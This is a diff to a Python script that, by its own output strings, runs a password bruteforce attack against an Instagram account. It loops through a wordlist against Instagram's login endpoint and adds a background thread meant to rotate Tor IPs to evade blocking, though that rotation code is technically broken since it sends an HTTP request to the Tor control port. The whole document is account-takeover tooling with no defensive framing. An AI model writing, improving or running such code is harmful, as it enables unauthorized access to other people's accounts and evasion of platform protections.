@@ -3,17 +3,31 @@ import time
 import sys
 from datetime import datetime
 from colorama import init, Fore, Style
+import threading
 
 # Initialize colorama
 init(autoreset=True)
 
+# Function to rotate Tor IP every 2 minutes
+def rotate_tor_ip():
+    while True:
+        try:
+            print(Fore.CYAN + "[*] Rotating Tor IP...")
+            # Send the "SIGNAL NEWNYM" command to Tor to rotate the IP
+            response = requests.get("http://127.0.0.1:9051", headers={"Authorization": "Tor"})
+            response.raise_for_status()  # Check for errors in the response
+            time.sleep(120)  # Wait for 2 minutes before rotating the IP again
+        except Exception as e:
+            print(Fore.RED + f"[-] Error rotating Tor IP: {e}")
+            time.sleep(120)  # Wait for 2 minutes before retrying if there's an error
+
 def instagram_login(username, password):
     session = requests.Session()
     login_url = 'https://www.instagram.com/accounts/login/ajax/'
-    
+
     # Use the current timestamp
     timestamp = int(datetime.now().timestamp())
-    
+
     payload = {
         'username': username,
         'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
@@ -38,7 +52,7 @@ def instagram_login(username, password):
         login_response.raise_for_status()  # Raise an error for bad responses
 
         response_data = login_response.json()
-        
+
         # Check for successful login
         if response_data.get('authenticated', False):
             return True
@@ -69,11 +83,16 @@ def main():
     print(Fore.GREEN + f"[*] Starting bruteforce attack on {username}")
     print(Fore.GREEN + f"[*] Loaded {len(passwords)} passwords from {password_file}")
 
+    # Start Tor IP rotation in the background
+    rotation_thread = threading.Thread(target=rotate_tor_ip)
+    rotation_thread.daemon = True  # Daemonize the thread so it ends with the main process
+    rotation_thread.start()
+
     for password in passwords:
         try:
             # Password attempt
             print(Fore.YELLOW + f"[+] Trying: {password}", end=" | ", flush=True)
-            
+
             if instagram_login(username, password):
                 print(Fore.GREEN + f"[+] Login successful for {username}:{password}")
                 break
@@ -95,4 +114,6 @@ def main():
     print(Fore.GREEN + "[*] Bruteforce attack completed.")
 
 if __name__ == "__main__":
-    main() 
+    main()
+    
+                    
